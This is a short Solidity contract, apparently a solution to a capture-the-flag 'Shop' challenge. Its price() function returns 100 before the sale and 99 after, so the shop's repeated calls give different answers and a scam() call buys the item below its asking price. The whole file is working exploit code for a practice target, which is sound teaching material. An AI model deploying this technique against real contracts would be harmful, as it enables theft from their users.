// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IBuyer, Shop} from "src/Shop/Shop.sol";

contract Buyer is IBuyer {
    Shop target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function scam() external {
        target.buy();
    }

    function price() public view returns (uint256) {
        if (target.isSold()) {
            return 99;
        }
        return 100;
    }
}
